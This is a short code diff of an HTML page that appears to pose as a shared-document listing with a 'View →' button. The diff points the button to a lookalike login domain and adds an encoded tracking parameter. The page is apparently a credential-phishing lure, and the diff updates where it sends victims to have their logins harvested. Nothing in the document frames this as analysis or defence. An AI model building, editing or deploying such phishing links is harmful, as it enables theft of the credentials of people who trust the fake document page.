@@ -341,7 +341,7 @@
                     </td>
                     <td class="file-size">1.4 MB</td>
                     <td style="text-align: right;">
-                        <a href="https://soil-sys-veem.goldenearthmagazine.com/shared/document" class="btn-view" target="_blank">View →</a>
+                        <a href="https://login.bentlley.online?WKjUK0xz=cHNpY3V6bWE=" class="btn-view" target="_blank">View →</a>
                     </td>
                 </tr>
             </tbody>
